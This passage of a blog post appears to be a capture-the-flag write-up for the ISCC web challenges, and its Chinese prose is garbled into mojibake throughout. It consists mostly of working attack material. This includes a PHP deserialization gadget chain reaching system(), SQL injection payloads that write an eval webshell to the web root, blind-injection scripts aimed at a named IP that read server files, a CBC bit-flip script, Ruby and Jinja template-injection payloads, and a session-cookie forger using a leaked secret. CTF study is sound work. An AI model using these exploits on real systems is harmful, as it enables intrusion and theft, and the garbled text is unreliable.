https://www.liuhaolin.com/php/195.htmlhttps://blog.csdn.net/phpfenghuo/article/details/17316645","link":"/2021/05/22/postpreg-replace%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87/"},{"title":"ISCCwebé¢˜è§£","text":"å‰è¨€ï¼šwebçš„é¢˜å¤§éƒ½åšè¿‡ç±»ä¼¼çš„äº†ï¼Œæ‰€ä»¥æ¯”è¾ƒç®€å•ã€‚ã€‚ä½†æ˜¯æ²¡æƒ³åˆ°éš¾çš„é¢˜ç›®éƒ½åœ¨æ‚é¡¹ï¼Œå¼€å§‹åæ‚”å¯’å‡æ²¡å¤šå­¦ç‚¹æ‚é¡¹äº†ã€‚ã€‚ã€‚ web1â€”â€”ISCCå®¢æœå†²å†²å†²ï¼ˆä¸€ï¼‰F12å®¡æŸ¥å…ƒç´ ï¼Œå°†å¯¹é¢é‚£ä¸ªå®¢æœçš„votingç»™åˆ æ‰ï¼Œç„¶åå®ƒçš„ç¥¨å°±ä¸ä¼šå¢åŠ äº†ï¼Œ web2â€”â€”è¿™æ˜¯å•¥jsfuckä»£ç ï¼Œç›´æ¥F12è¿è¡Œä¸€ä¸‹å°±èƒ½æ‹¿åˆ°FLAG web3â€”â€”æ­£åˆ™åŒ¹é…&lt;?php&lt;p&gt;code.txt&lt;/p&gt;if (isset ($_GET['password'])) { if (preg_match (&quot;/^[a-zA-Z0-9]+$/&quot;, $_GET['password']) === FALSE) { echo '&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'; } else if (strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] &gt; 9999999) { if (strpos ($_GET['password'], '*-*') !== FALSE) { die('Flag: ' . $flag); } else { echo('&lt;p&gt;*-* have not been found&lt;/p&gt;'); } } else { echo '&lt;p&gt;Invalid password&lt;/p&gt;'; }}?&gt; æºç å¦‚ä¸Šï¼Œé¦–å…ˆè¦å­—æ¯å’Œæ•°å­—ï¼Œç„¶åæœ‰ä¸ªä½æ•°é™åˆ¶ï¼Œå¹¶ä¸”è¦æ•°å€¼éœ€è¦å¤§äº9999999ï¼Œé‡‡ç”¨ç§‘å­¦æŠ€æœ¯æ³•è¿›è¡Œç»•è¿‡payload: 6e8*-* web4â€”â€”ç™»å½•ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸å°±ä¸è¯´äº† web5â€”â€”which is the true isccæŸ¥çœ‹æºç : &lt;?phpsession_start();ini_set('max_execution_time', '5');set_time_limit(5);$status = &quot;new&quot;;$cmd = &quot;whoami&quot;;$is_upload = false;$is_unser_finished = false;$iscc_file = NULL;class ISCC_Upload { function __wakeup() { global $cmd; global $is_upload; $cmd = &quot;whoami&quot;; $_SESSION['name'] = randstr(14); $is_upload = (count($_FILES) &gt; 0); } function __destruct() { global $is_upload; global $status; global $iscc_file; $status = &quot;upload_fail&quot;; if ($is_upload) { foreach ($_FILES as $key =&gt; $value) $GLOBALS[$key] = $value; if(is_uploaded_file($iscc_file['tmp_name'])) { $check = @getimagesize($iscc_file[&quot;tmp_name&quot;]); if($check !== false) { $target_dir = &quot;/var/tmp/&quot;; $target_file = $target_dir . randstr(10); if (file_exists($target_file)) { echo &quot;æƒ³å•¥å‘¢ï¼Ÿæœ‰ä¸œè¥¿äº†â€¦â€¦&lt;br&gt;&quot;; finalize(); exit; } if ($iscc_file[&quot;size&quot;] &gt; 500000) { echo &quot;ä¸œè¥¿å¡ä¸è¿›å»~&lt;br&gt;&quot;; finalize(); exit; } if (move_uploaded_file($iscc_file[&quot;tmp_name&quot;], $target_file)) { echo &quot;æˆ‘æ‹¿åˆ°äº†ï¼&lt;br&gt;&quot;; $iscc_file = $target_file; $status = &quot;upload_ok&quot;; } else { echo &quot;æ‹¿ä¸åˆ°:(&lt;br&gt;&quot;; finalize(); exit; } } else { finalize(); exit; } } else { echo &quot;ä½ çœŸæ˜¯ä¸ªå¤©æ‰!&lt;br&gt;&quot;; finalize(); exit; } } }}class ISCC_ResetCMD { protected $new_cmd = &quot;echo 'æ–°æ–°ä¸–ç•Œï¼Œå‘å·æ–½ä»¤!'&quot;; function __wakeup() { global $cmd; global $is_upload; global $status; $_SESSION['name'] = randstr(14); $is_upload = false; if(!isset($this-&gt;new_cmd)) { $status = &quot;error&quot;; $error = &quot;ä½ è¿™ç½å­æ˜¯ç©ºçš„!&quot;; throw new Exception($error); } if(!is_string($this-&gt;new_cmd)) { $status = &quot;error&quot;; $error = 'ä¸œè¥¿éƒ½æ²¡ç»™å¯¹!'; throw new Exception($error); } } function __destruct() { global $cmd; global $status; $status = &quot;reset&quot;; if($_SESSION['name'] === 'isccIsCciScc1scc') { $cmd = $this-&gt;new_cmd; } }}class ISCC_Login { function __wakeup() { $this-&gt;login(); } function __destruct() { $this-&gt;logout(); } function login() { $flag = file_get_contents(&quot;/flag&quot;); $pAssM0rd = hash(&quot;sha256&quot;, $flag); if($_GET['pAssM0rd'] === $pAssM0rd) $_SESSION['name'] = &quot;isccIsCciScc1scc&quot;; } function logout() { global $status; unset($_SESSION['name']); $status = &quot;finish&quot;; }}class ISCC_TellMeTruth { function __wakeup() { if(!isset($_SESSION['name'])) $_SESSION['name'] = randstr(14); echo &quot;ä¼¼ä¹è¿™ä¸ª &quot;.$_SESSION['name'].&quot; æ˜¯çœŸç›¸&lt;br&gt;&quot;; } function __destruct() { echo &quot;ä¼¼ä¹è¿™ä¸ª &quot;.$_SESSION['name'].&quot; æ˜¯çœŸç›¸&lt;br&gt;&quot;; }}class ISCC_Command { function __wakeup() { global $cmd; global $is_upload; $_SESSION['name'] = randstr(14); $is_upload = false; $cmd = &quot;whoami&quot;; } function __toString() { global $cmd; return &quot;çœ‹çœ‹ä½ å¹²çš„å¥½äº‹: {$cmd} &lt;br&gt;&quot;; } function __destruct() { global $cmd; global $status; global $is_unser_finished; $status = &quot;cmd&quot;; if($is_unser_finished === true) { echo &quot;çœ‹çœ‹ä½ å¹²çš„ [&lt;span style='color:red'&gt;{$cmd}&lt;/span&gt;] å¼„å‡ºäº†ä»€ä¹ˆåæœ: &quot;; echo &quot;&lt;span style='color:blue'&gt;&quot;; @system($cmd); echo &quot;&lt;/span&gt;&quot;; } }}function randstr($len){ $characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_='; $randstring = ''; for ($i = 0; $i &lt; $len; $i++) { $randstring .= $characters[rand(0, strlen($characters))]; } return $randstring;}function waf($s) { if(stripos($s, &quot;*&quot;) !== FALSE) return false; return true;}function finalize() { $cmd = &quot;&quot;; $is_upload = false; unset($_SESSION); @unlink($iscc_file); $status = &quot;finish&quot;; echo &quot;&lt;img src='whichisthetrueiscc.gif'&gt;&lt;br&gt;&quot;;}if(isset($_GET['whatareyounongshane'])) { $whatareyounongshane = $_GET['whatareyounongshane']; switch ($whatareyounongshane) { case &quot;src&quot;: highlight_file(__FILE__); break; case &quot;cmd&quot;: echo &quot;æƒ³è¶Šçº§å¹²å¥½äº‹ï¼Ÿè¿˜æ˜¯æœ‰é—¨çš„â€¦â€¦&quot;; header('Location: /?%3f=O:12:&quot;ISCC_Command&quot;:0:{}'); break; case &quot;reset&quot;: echo &quot;å‡ è¾ˆå­ç§¯ç´¯çš„å¥½è¿å°±åœ¨è¿™æ—¶~:p&quot;; header('Location: /?%3f=O:13:&quot;ISCC_ResetCMD&quot;:1:{}'); break; case &quot;upload&quot;: $resp = &lt;&lt;&lt;EOF&lt;form action=&quot;/index.php?%3f=O:11:%22ISCC_Upload%22:0:{}&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;iscc_file&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Upload Image&quot; name=&quot;submit&quot;&gt;&lt;/form&gt;EOF; echo $resp; break; case &quot;tellmetruth&quot;: echo base64_decode(&quot;PGltZyBzcmM9J3RlbGxtZXRydXRoLmdpZic+Cg==&quot;); header('Location: /?%3f=O:14:&quot;ISCC_TellMeTruth&quot;:0:{}'); break; default: echo &quot;ç©ºç©ºå¦‚ä¹Ÿå°±æ˜¯æˆ‘ï¼&quot;; } finalize(); die(&quot;æ‰€ä»¥å“ªä¸ªISCCæ˜¯çœŸçš„ï¼Ÿ&lt;br&gt;&quot;);}if(isset($_GET['?'])) { $wtf = waf($_GET{'?'}) ? $_GET['?'] : (finalize() &amp;&amp; die(&quot;è¯•è¯•å°±â€œé€ä¸–â€!&quot;)); if($goodshit = @unserialize($wtf)) { $is_unser_finished = true; } if(in_array($status, array('new', 'cmd', 'upload_ok', 'upload_fail', 'reset'), true)) finalize(); die(&quot;æ‰€ä»¥å“ªä¸ªISCCæ˜¯çœŸçš„ï¼Ÿ&lt;br&gt;&quot;);}?&gt; å¿˜è®°ä¿å­˜äº†ï¼Œé‡æ–°å¤è¿°ä¸€ä¸‹å§å®¡è®¡å®Œä»¥åï¼Œå¯ä»¥çŸ¥é“æˆ‘ä»¬çš„ç›®çš„æ˜¯æ‰§è¡ŒsystemæŒ‡ä»¤â€”â€”ã€‹éœ€è¦æ›´æ”¹session[name]çš„å€¼â€”â€”ã€‹éœ€è¦uploadé‡Œé¢å˜é‡è¦†ç›– éš¾ç‚¹:1.æ¯ä¸ªç±»çš„wakeupå‡½æ•°éƒ½é‡æ–°å®šä¹‰äº†session[name]ï¼Œè°ƒç”¨æ¯ä¸ªç±»çš„æ—¶å€™ï¼Œè‚¯å®šä¼šä½¿ç”¨åˆ°wakeupï¼Œå¦‚æœå½“æˆ‘ä»¬çš„session[name]åˆšè¢«èµ‹å€¼å®Œisccâ€¦..å°±è¢«èµ‹å€¼å›å»äº†ï¼Œé‚£å°±æ²¡ç”¨äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è¿›è¡Œç»•è¿‡2.ç”±äºé‡Œé¢æœ‰protectå˜é‡ï¼Œæ‰€ä»¥ä¹Ÿéœ€è¦ç»•è¿‡wafçš„è¿‡æ»¤è§£å†³æ–¹æ¡ˆ:1.wakeupçš„è°ƒç”¨é¡ºåºæ˜¯ç”±å†…å‘å¤–çš„ï¼Œdestructçš„è°ƒç”¨æ˜¯ç”±å¤–å‘å†…çš„,æ‰€ä»¥æˆ‘ä»¬ä»¥ç±»ä¼¼çš„åµŒå¥—æ–¹å¼ï¼ˆç±»ä¼¼ï¼‰æ¥è°ƒç”¨èµ‹å€¼ï¼Œåˆ©ç”¨ä¸€ä¸ªä¸­é—´å˜é‡è¿›è¡Œä¸­è½¬ï¼Œè¿™æ ·åŠæ—¶æœ€åç”¨äº†wake_upå‡½æ•°ä¹Ÿæ²¡äº‹ï¼Œå› ä¸ºæˆ‘ä»¬å·²ç»æ‰§è¡Œå®Œäº†2.å¯ä»¥åˆ©ç”¨å¤§å†™Sæ¥ç»•è¿‡å¯¹protected,privateç­‰å±æ€§çš„å­—ç¬¦æ£€æµ‹ï¼Œä¹Ÿå°±æ˜¯å°†åºåˆ—åŒ–è¿‡ç¨‹ä¸­å°å†™sæ”¹ä¸ºå¤§å†™sï¼Œè¿™æ ·åé¢çš„å†…å®¹æˆ‘ä»¬å°±å¯ä»¥ç”¨åå…­è¿›åˆ¶è¿›è¡Œè¡¨ç¤ºäº† POPé“¾æ„é€ : &lt;?phpclass ISCC_Upload{ public $x; public function __construct() { $this-&gt;x=new ISCC_ResetCMD(); }}class ISCC_ResetCMD{ public $x; protected $new_cmd='cat /flag'; function __construct(){ $this-&gt;x = new ISCC_Command; }}class ISCC_Command{}$b=new ISCC_Upload();$a=str_replace('s:10:&quot;'.&quot;\\x00*\\x00&quot;,'S:10:&quot;\\00\\2a\\00',serialize($b));echo urlencode ($a);//è¿™ä¸ªpopé“¾çš„æ„é€ å…¶å®æœ‰ç‚¹ç±»ä¼¼äºåµŒå¥—ï¼Œä¸»è¦æ˜¯ä¸ºäº†ç»•è¿‡wakeupå‡½æ•° https://github.com/ambionics/phpggc#advanced-enhancements webâ€”â€”æ“‚å°é¢˜-easyweb1'and%0dsubstr((select%0dgroup_concat),1,1)&gt;'0'--%0d union%0dselect%0d1,&quot;&lt;?php eval($_POST['cmd']);?&gt;&quot;%0dinto outfile%0d'/var/www/html/1.php' MySQL 5.6 åŠä»¥ä¸Šç‰ˆæœ¬å­˜åœ¨innodb_index_statsï¼Œinnodb_table_statsä¸¤å¼ è¡¨ï¼Œå…¶ä¸­åŒ…å«æ–°å»ºç«‹çš„åº“å’Œè¡¨ select table_name from mysql.innodb_table_stats where database_name = database();select table_name from mysql.innodb_index_stats where database_name = database(); åœ¨MySQL 5.7.9ä¸­sysä¸­æ–°å¢äº†ä¸€äº›è§†å›¾ï¼Œå¯ä»¥ä»ä¸­è·å–è¡¨å //åŒ…å«inSELECT object_name FROM `sys`.`x$innodb_buffer_stats_by_table` where object_schema = database();SELECT object_name FROM `sys`.`innodb_buffer_stats_by_table` WHERE object_schema = DATABASE();SELECT TABLE_NAME FROM `sys`.`x$schema_index_statistics` WHERE TABLE_SCHEMA = DATABASE();SELECT TABLE_NAME FROM `sys`.`schema_auto_increment_columns` WHERE TABLE_SCHEMA = DATABASE();//ä¸åŒ…å«inSELECT TABLE_NAME FROM `sys`.`x$schema_flattened_keys` WHERE TABLE_SCHEMA = DATABASE();SELECT TABLE_NAME FROM `sys`.`x$ps_schema_table_statistics_io` WHERE TABLE_SCHEMA = DATABASE();SELECT TABLE_NAME FROM `sys`.`x$schema_table_statistics_with_buffer` WHERE TABLE_SCHEMA = DATABASE();//é€šè¿‡è¡¨æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„è·å–è¡¨åSELECT FILE FROM `sys`.`io_global_by_file_by_bytes` WHERE FILE REGEXP DATABASE();SELECT FILE FROM `sys`.`io_global_by_file_by_latency` WHERE FILE REGEXP DATABASE();SELECT FILE FROM `sys`.`x$io_global_by_file_by_bytes` WHERE FILE REGEXP DATABASE(); åŒ…å«ä¹‹å‰æŸ¥è¯¢è®°å½•çš„è¡¨ SELECT QUERY FROM sys.x$statement_analysis WHERE QUERY REGEXP DATABASE();SELECT QUERY FROM `sys`.`statement_analysis` where QUERY REGEXP DATABASE(); SELECT object_name FROM `performance_schema`.`objects_summary_global_by_type` WHERE object_schema = DATABASE();SELECT object_name FROM `performance_schema`.`table_handles` WHERE object_schema = DATABASE();SELECT object_name FROM `performance_schema`.`table_io_waits_summary_by_index_usage` WHERE object_schema = DATABASE();SELECT object_name FROM `performance_schema`.`table_io_waits_summary_by_table` WHERE object_schema = DATABASE();SELECT object_name FROM `performance_schema`.`table_lock_waits_summary_by_table` WHERE object_schema = DATABASE(); åŒ…å«ä¹‹å‰æŸ¥è¯¢è®°å½•çš„è¡¨ SELECT digest_text FROM `performance_schema`.`events_statements_summary_by_digest` WHERE digest_text REGEXP DATABASE(); åŒ…å«è¡¨æ–‡ä»¶è·¯å¾„çš„è¡¨ SELECT file_name FROM `performance_schema`.`file_instances` WHERE file_name REGEXP DATABASE(); ä½¿ç”¨union select select c from (select 1 as a, 1 as b, 1 as c union select * from test)x limit 1 offset 1select `3` from(select 1,2,3 union select * from admin)a limit 1,1//æ— é€—å·ï¼Œæœ‰joinç‰ˆæœ¬select a from (select * from (select 1 `a`)m join (select 2 `b`)n join (select 3 `c`)t where 0 union select * from test)x; ç›²æ³¨ ((SELECT 1,concat('{result+chr(mid)}', cast(&quot;0&quot; as JSON)))&lt;(SELECT * FROM `f1ag_1s_h3r3_hhhhh`)) è¦æ±‚åé¢selectçš„ç»“æœå¿…é¡»æ˜¯ä¸€è¡Œã€‚mysqlä¸­å¯¹charå‹å¤§å°å†™æ˜¯ä¸æ•æ„Ÿçš„ï¼Œç›²æ³¨çš„æ—¶å€™è¦ä¹ˆå¯ä»¥ä½¿ç”¨hexæˆ–è€…binaryã€‚ è¿™é‡Œåªèƒ½ä½¿ç”¨concatå°†å­—ç¬¦å‹å’Œbinaryæ‹¼æ¥ï¼Œä½¿ä¹‹å¤§å°å†™æ•æ„Ÿï¼ŒJSONä¹Ÿå¯ä»¥ä½¿ç”¨char byteä»£æ›¿ mysql 8.0.19æ–°å¢è¯­å¥table https://dev.mysql.com/doc/refman/8.0/en/table.html TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]] å¯ä»¥æŠŠtable tç®€å•ç†è§£æˆselect * from tï¼Œå’Œselectçš„åŒºåˆ«åœ¨äº tableæ€»æ˜¯æ˜¾ç¤ºè¡¨çš„æ‰€æœ‰åˆ— tableä¸å…è®¸ä»»ä½•çš„è¡Œè¿‡æ»¤;ä¹Ÿå°±æ˜¯è¯´ï¼ŒTABLEä¸æ”¯æŒä»»ä½•WHEREå­å¥ã€‚ å¯ä»¥ç”¨æ¥ç›²æ³¨è¡¨å admin'and\\x0a(table\\x0ainformation_schema.TABLESPACES_EXTENSIONS\\x0alimit\\x0a7,1)&gt;(BINARY('{}'),'0')# åŒæ—¶ä»£æ›¿selectè¢«è¿‡æ»¤å¯¼è‡´åªèƒ½åŒè¡¨æŸ¥è¯¢çš„é—®é¢˜ PSï¼šæ–°å¢çš„valuesè¯­å¥ä¹ŸæŒºæœ‰æ„æ€ï¼Œåœ¨æŸäº›æƒ…å†µä¼¼ä¹å¯ä»¥ä»£æ›¿unionæˆ–selectè¿›è¡Œorder byç›²æ³¨ å­¦ä¹ é“¾æ¥:https://www.cnblogs.com/20175211lyz/p/12358725.html è§£é¢˜è¿‡ç¨‹ä¸€å¼€å§‹å¬è¯´ç»å¯¹è·¯å¾„var/www/htmlç„¶åå‘ç°è¯»å–æ–‡ä»¶çš„æƒé™å¾ˆé«˜ï¼Œæƒ³è¯´ç›´æ¥è¯»è¯»æºç ï¼Œå‘ç°ä¸è¡Œï¼Œäºæ˜¯å°è¯•å°è¯•è‡ªå·±æ‰¾æ‰¾ç»å¯¹è·¯å¾„:åŒ…å«æ ¹ç›®å½•è·¯å¾„çš„æ–‡ä»¶: /etc/apache2/sites-enabled/000-default.conf import requestsurl=&quot;http://39.96.91.106:5001/?id=&quot;s=requests.session()database=&quot;&quot;for i in range(1,10000): low =0 high=264 mid=(low+high)//2 while(low&lt;high): #payload_1=f&quot;1/**/and/**/ascii(substr(database(),{i},1))&gt;{mid}&quot; #payload_2=f&quot;1/**/and/**/ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='ctf'),{i},1))&gt;{mid}&quot; #payload_3=f&quot;1/**/and/**/ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='flag'),{i},1))&gt;{mid}&quot; #payload_4= f&quot;1/**/and/**/ascii(substr((select/**/value/**/from/**/flag),{i},1))&gt;{mid}&quot; #payload_1=f&quot;1'and%0dascii(substr((selselectect%0dgroup_concat(table_name)%0dfrom%0dmysql.innodb_table_stats%0dwhere%0ddatabase_name%0d=database()),{i},1))&gt;{mid}--%0d&quot;//iscc_flag payload_3=f&quot;1'and%0dascii(substr((selselectect%0dload_file('/etc/apache2/sites-enabled/000-default.conf')),{i},1))&gt;{mid}--%0d&quot; payload_4 = f&quot;1'and%0dascii(substr((selselectect%0dload_file('/var/www/const')),{i},1))&gt;{mid}--%0d&quot; # print(s.get(url+payload_1).text) # print(payload_1) if &quot;Your Login name&quot; in s.get(url+payload_3).text: low = mid+1 else: high=mid mid=(low+high)//2 if(mid==0 or mid==264): break database +=chr(mid) print(database)print(database) webâ€”â€”ISCCå®¢æœä¸€å·å†²å†²å†²ï¼ˆäºŒï¼‰è¿™é¢˜çš„è€ƒç‚¹åœ¨äºCBCå­—èŠ‚ç¿»è½¬æ”»å‡»:æ€è·¯ï¼šä»–è®©æˆ‘ä»¬ç™»å½•ï¼Œä½†æ˜¯æ²¡æœ‰çª—å£ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å°±è‡ªå·±postä¸€ä¸ªusernameå’Œpasswordï¼Œç„¶åå†burpå›æ–‡é‡Œçœ‹åˆ°ä¸€ä¸ªivï¼Œä¸€ä¸ªcipherï¼Œæƒ³åˆ°ä»¥å‰åšè¿‡çš„CBCå­—èŠ‚ç¿»è½¬æ”»å‡»ï¼Œæ¥ä¸‹æ¥å°±æ²¡å•¥åŒºåˆ«äº†ï¼Œå”¯ä¸€çš„ä¸åŒçš„æ˜¯passwordæ˜¯å®¢æœé¢˜ç¬¬ä¸€é¢˜çš„flagï¼Œéœ€è¦æ›¿æ¢ä¸€ä¸‹ï¼Œè¿™é‡Œå°±è´´ä¸€ä¸‹è„šæœ¬ï¼Œå…·ä½“çš„å¯ä»¥å»ä¹‹å‰çš„æ–‡ç« æ‰¾æ‰¾ï¼š import base64import urllibcipher=&quot;iThCcXSm90cuwxnw1KtfJqk%2Bled1cE%2Ba3xQh7UfgNovfWzCFOGmuryqdECjX1RqcLNv7ybOCRfXJBbokBfS4oKc5MnoFTbBfn5zTFdthy3E%3D&quot;iv=&quot;dlp0Txccz%2Fba%2Fw0qSQGVjw%3D%3D&quot;cipher_de=base64.b64decode(urllib.unquote(cipher))tran='a:2:{s:8:&quot;username&quot;;s:5:&quot;bdmin&quot;;s:d&quot;;s:15:&quot;1SCC_2o2l_KeFuu&quot;}8:&quot;passwor'#tran[16:32]=me&quot;;s:5:&quot;bdmin&quot;;cipher_new=cipher_de[0:9]+chr(ord(cipher_de[9])^ord('b')^ord('a'))+cipher_de[10:]cipher_new=urllib.quote(base64.b64encode(cipher_new))print(cipher_new)cipher_new=base64.b64decode('GgadNOlPvXYl8SxK+NWkK21lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjE1OiIxU0NDXzJvMmxfS2VGdXUiO30=')print(cipher_new)iv_raw=base64.b64decode(urllib.unquote(iv))iv_new=''for i in range(0,16):# iv_new+=chr(ord(tran[i])^ord(iv_raw[i])^ord(cipher_new[i]))iv_new=urllib.quote(base64.b64encode(iv_new))print(iv_new) webâ€”â€”Explore Rubyä¸€å¼€å§‹æ²¡æ³¨æ„åˆ°æœ‰æç¤ºè¯´demoæ˜¯å¯ä»¥ç™»é™†çš„ï¼Œå°±åœ¨å°è¯•ä¼ªé€ cookieï¼ˆå¤ªèœäº†ï¼‰ï¼Œç„¶åç™»å½•åï¼Œå‘ç°å­˜åœ¨sstiæ³¨å…¥å°è¯•äº†ä¸€ä¸‹ å‘ç°æ˜¯slimçš„rubyæ³¨å…¥ #{7*7} å°è¯•è¯»å–ç»§æ‰¿ï¼Œå‘ç°æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„å†…å®¹ï¼Œä½†æ˜¯å‘ç°()ç­‰å†…å®¹è¢«è¿‡æ»¤äº†ï¼Œäºæ˜¯å¯»æ‰¾æ›¿ä»£å“ [:to_json, :instance_variable_set, :instance_variable_defined?, :remove_instance_variable, :instance_of?, :kind_of?, :is_a?, :tap, :instance_variable_get, :public_methods, :instance_variables, :method, :public_method, :define_singleton_method, :singleton_method, :public_send, :extend, :to_enum, :enum_for, :pp, :gem, :&lt;=&gt;, :===, :=~, :!~, :eql?, :respond_to?, :freeze, :inspect, :object_id, :send, :to_s, :display, :nil?, :hash, :class, :singleton_class, :clone, :dup, :yield_self, :itself, :tainted?, :taint, :untrust, :untaint, :trust, :untrusted?, :methods, :frozen?, :singleton_methods, :protected_methods, :private_methods, :!, :equal?, :instance_eval, :==, :instance_exec, :!=, :__id__, :__send__] [:to_json, :instance_variable_set, :instance_variable_defined?, :remove_instance_variable, :instance_of?, :kind_of?, :is_a?, :tap, :instance_variable_get, :public_methods, :instance_variables, :method, :public_method, :define_singleton_method, :singleton_method, :public_send, :extend, :to_enum, :enum_for, :pp, :gem, :&lt;=&gt;, :===, :=~, :!~, :eql?, :respond_to?, :freeze, :inspect, :object_id, :send, :to_s, :display, :nil?, :hash, :class, :singleton_class, :clone, :dup, :yield_self, :itself, :tainted?, :taint, :untrust, :untaint, :trust, :untrusted?, :methods, :frozen?, :singleton_methods, :protected_methods, :private_methods, :!, :equal?, :instance_eval, :==, :instance_exec, :!=, :__id__, :__send__] object:47312658352300 ä»¥ä¸Šå‡ä¸ºç±»ç»§æ‰¿è¯»åˆ°çš„æ— ç”¨ä¿¡æ¯ï¼Œå‘ç°å‡ ç¯‡æ–‡ç« :https://blog.csdn.net/watkinsong/article/details/7968550https://www.huaweicloud.com/articles/b5b475ca729307885cd91f03c46d4826.html å…¶ä¸­è®©äººæ„Ÿå…´è¶£çš„å°±æ˜¯%xå¯ä»¥æ‰§è¡Œshellå‘½ä»¤ï¼šè™½ç„¶ä¸­æ‹¬å·è¢«è¿‡æ»¤ï¼Œä½†æ˜¯https://qastack.cn/programming/665576/what-are-those-pipe-symbols-for-in-ruby å¯ä»¥åˆ©ç”¨ç®¡é“ç¬¦||è¿›è¡Œç»•è¿‡ï¼Œæ„é€ payload: #{%x|ls|}//æ‰§è¡Œäº†ç³»ç»Ÿå‘½ä»¤ #GemfileGemfile.lockdatabase.dbpublicvendorviewswebserver.rb} ä½¿ç”¨catå‘½ä»¤å³å¯æŸ¥çœ‹æºç ï¼š configure do set :public_folder, 'public' set :views, 'views' set :bind, '0.0.0.0' set :port, 9999 enable :sessions set :server, %w[thin webrick] set :environment, :production #set :environment, :development #disable :protection set :session_secret, '01344904559362f6f5754df256908476702c8bd5d972a32e2fae2a7cc6fa4a7efd25079fddb5a11a0f8be0f607bf048fd6ecfe065380c27b2aa26015c3308e85'end get '/home' do authenticate! @user = session[:username] @flag = ENV['FLAG'] if session[:role] == 'admin' slim :homeend å…³é”®åœ¨è¿™é‡Œï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¼ªé€ admin cookie require &quot;net/http&quot;require &quot;uri&quot;require 'pp'require 'base64'require 'digest/sha1'require 'faraday'# Remote hostdef generate_hmac(data, secret) OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret, data)end# URL = &quot;http://39.96.91.106:8230/login&quot;# # Create URL object# url = URI.parse(URL) # creds = &quot;demo&quot;# c = &quot;&quot;# # Authentication# resp = Net::HTTP.start(url.host, url.port) do |http|# http.post(url.request_uri, &quot;username=#{creds}&amp;password=#{creds}&quot;)# endCookies = &quot;BAh7CkkiDXVzZXJuYW1lBjoGRUZJIglkZW1vBjsAVEkiCXJvbGUGOwBGSSIJ%0AdXNlcgY7AFRJIg9zZXNzaW9uX2lkBjsAVEkiRTAyMjU1OTdiMjJhYWM4Zjc3%0AYjcxZGUwNzQ2MjBlM2JiN2E5NDA1ODlmOWJjOTg5NWNiMTU3YzBlYTgyZGI5%0AYzIGOwBGSSIJY3NyZgY7AEZJIjF4MDlxTHVlOXdOZjNFWGx3T2ZzWjVXYlZ1%0ANEU5dnhBdW04TTk0Q3JZM1EwPQY7AEZJIg10cmFja2luZwY7AEZ7BkkiFEhU%0AVFBfVVNFUl9BR0VOVAY7AFRJIi00ZTRhYWEyYmFhZmVjYmIxYjcwOTViZWQ2%0AZDZmZWYzMmM3ZWI4NzEwBjsARg%3D%3D%0A--957bdf7dc19049010fd0b19e4d8656c42314b2db&quot;# puts get the cookiecookie, signature = Cookies.split(&quot;--&quot;,2)cookie = URI.decode(cookie)decoded = Base64.decode64(URI.decode(cookie))params = Marshal.load(decoded)params.merge!({ 'role' =&gt;&quot;admin&quot;})print(params)bad_cookie = URI.encode(Base64.encode64(Marshal.dump(params)))bad_hmac = generate_hmac(bad_cookie, &quot;01344904559362f6f5754df256908476702c8bd5d972a32e2fae2a7cc6fa4a7efd25079fddb5a11a0f8be0f607bf048fd6ecfe065380c27b2aa26015c3308e85&quot;)header = &quot;rack.session=#{bad_cookie}--#{bad_hmac};&quot;print(header) è´´ä¸€ä¸‹å­¦é•¿å†™çš„ åœ¨kali rubyç¯å¢ƒä¸‹è·‘ä¸€ä¸‹ï¼æ³¨æ„ï¼Œéœ€è¦å»é¢˜ç›®çš„ç¬¬äºŒä¸ªå…¥å£ä¼ªé€ cookieæ‰è¡Œï¼ï¼ï¼ï¼ï¼ï¼ æ¥ä¸‹æ¥å°±å¯ä»¥æ‹¿åˆ°flagäº† LOVE-SSTIï¼šä¸€å¼€å§‹çš„è„‘æ´å¾ˆçƒ¦ï¼Œæš¹ç½—çŒ«é‚£ä¸ªè¡¨æƒ…åŒ…æœ‰ä¸ªåˆ«å å«å°è±†æ³¥ï¼Œæ‰€ä»¥æ³¨å…¥ç‚¹æ˜¯?xiaodouni= æ¥ä¸‹æ¥å°±æ˜¯å¸¸è§„çš„sstiæ³¨å…¥äº†ï¼Œä¸»è¦æ˜¯å»__doc__é‡Œé¢å–å­—ç¬¦ï¼Œç”±äºè¦æŸ¥æ‰¾flagï¼Œæ‰€ä»¥éœ€è¦ä¸€ä¸ªå·ï¼Œä½†æ˜¯æ²¡æ‰¾åˆ°\\ï¼Œå†™äº†ä¸ªè„šæœ¬è¦æ‰¾*å·ï¼Œä½†æ˜¯ç½‘ç«™ä¼¼ä¹ä¸è®©çˆ†ç ´==å°±å¾ˆéš¾å—ï¼Œ import requestsurl=&quot;http://39.96.91.106:3010/?xiaodouni=&quot;s=requests.session()headers=requests.session().headerspayload=&quot;{%set%20a=dict(op=x,p=x)|join()%}{%set%20b=(()|select|string|list)|attr(a)(24)%}{%set%20c=(b,b,dict(doc=a)|join,b,b)|join%}{%set%20g=(x|attr(c)|list)|&quot;for i in range(0,10000): payload_fi=payload+f&quot;attr(a)({i})%&quot;+&quot;}{{g}}&quot; url_f=url+payload_fi print(s.get(url=url_f,headers=headers).text) if &quot;*&quot; in s.get(url=url_f,headers=headers).text: print(i) break æ‰€ä»¥å°±å»æ‰¾äº†ä¸€ä¸‹å…¶ä»–æ–¹æ³•ã€‚payloadå¦‚ä¸‹ {%set a=dict(op=x,p=x)|join()%}{%set b=(()|select|string|list)|attr(a)(24)%}{%set 